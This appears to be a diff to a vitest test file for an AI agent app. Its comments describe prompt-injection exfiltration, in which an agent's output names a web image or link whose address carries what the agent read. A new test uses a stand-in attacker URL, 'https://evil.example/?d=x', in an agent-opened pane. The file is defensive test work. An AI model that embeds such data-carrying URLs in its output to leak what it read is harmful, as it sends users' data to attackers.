@@ -1,11 +1,14 @@
 // @vitest-environment happy-dom
-// Images on the web aren't fetched until the user asks: what names one is often an agent's (a message, a file it wrote,
-// a block), and its address can carry what the agent read. Until then each says where it's from, to click; a click
-// loads it, and the other web images of the same message with it. Files and data: images show as ever.
+// What an agent's output names on the web isn't fetched until the user asks: its address can carry what the agent read
+// (prompt-injected), and fetching it as it shows would send that out with no tool call to see. A web image says where
+// it's from until clicked; a click loads it, and the other web images of the same message with it. Files and data:
+// images show as ever. A pane an agent's block opens is the agent's choice, though the user pressed it.
 import { act, createElement as h } from 'react'
 import { createRoot, type Root } from 'react-dom/client'
 import { afterEach, expect, it } from 'vitest'
+import { defineApp, type Block, type ThreadInfo } from '@superego/protocol'
 import type { MachineEntry } from '../src/shared/bridge.ts'
+import { createRegistry, RegistryProvider } from '../src/renderer/registry.tsx'
 import { Images, imagesIn, Markdown } from '../src/renderer/Markdown.tsx'
 import { Blocks } from '../src/renderer/blocks/blocks.tsx'
 import { imageReadAlready, imageSourceOf, loadWebImages } from '../src/renderer/images.tsx'
@@ -67,4 +70,15 @@ it('gives no address for a web image not asked for, wherever it is read (the lig
   loadWebImages([image.url])
   expect(imageReadAlready(machine, 't', image, 'whole')).toBe(image.url)
   await expect(imageSourceOf(machine, 't', image, 'whole')).resolves.toBe(image.url)
+})
+
+it("opens an agent's pane link as its choice, though the user pressed it: a page elsewhere still waits for them", async () => {
+  const calls: unknown[][] = []
+  ;(window as { superego?: unknown }).superego = { call: async (...args: unknown[]) => { calls.push(args); return { id: 'p1', kind: 'browser' } } }
+  const thread: ThreadInfo = { id: 't1', title: 't', cwd: '/', createdAt: 0, activeAt: 0, project: { root: '/', name: '/' }, status: { state: 'idle' } }
+  const blocks: Block[] = [{ type: 'open', label: 'See the chart', kind: 'browser', params: { url: 'https://evil.example/?d=x' } }]
+  const registry = createRegistry(defineApp({ name: 'superego', id: 'superego' }), [], () => {})
+  await draw(h(RegistryProvider, { registry, children: h(Blocks, { machine, thread, blocks, host: { by: 'agent' } }) }))
+  await act(async () => { [...container.querySelectorAll('button')].find((b) => b.textContent === 'See the chart')!.click() })
+  expect(calls).toContainEqual(['m', 'action.run', expect.objectContaining({ id: 'pane.open', params: { thread: 't1', kind: 'browser', params: { url: 'https://evil.example/?d=x' }, by: 'agent' } })])
 })
